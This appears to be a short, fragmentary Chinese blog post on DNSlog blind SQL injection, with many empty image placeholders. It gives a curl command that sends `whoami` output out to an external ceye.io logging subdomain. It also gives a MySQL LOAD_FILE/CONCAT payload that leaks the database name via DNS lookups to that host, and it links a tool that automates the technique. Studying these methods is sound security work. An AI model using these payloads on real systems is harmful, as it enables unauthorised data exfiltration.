---
layout: post
title: "1.3.3-SQL注入-SQL盲注-Dnslog盲注"
date: 2018-06-23
category: web安全
tags: sql注入 sql盲注
---

## DnsLog盲注

### DnsLog盲注原理
[]
[]
Dnslog平台：http://ceye.io/  
[]

	http://ceye.io/profile
	curl mzq83x.ceye.io

[minglingh]

	curl `whoami`.mzq83x.ceye.io

[]
[]
[]



### DnsLog盲注方法
[]

	核心语法： SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.r5ourp.ceye.io\\abc'));
	sql语句不能含有特殊符号


https://github.com/ADOOO/DnslogSqlinj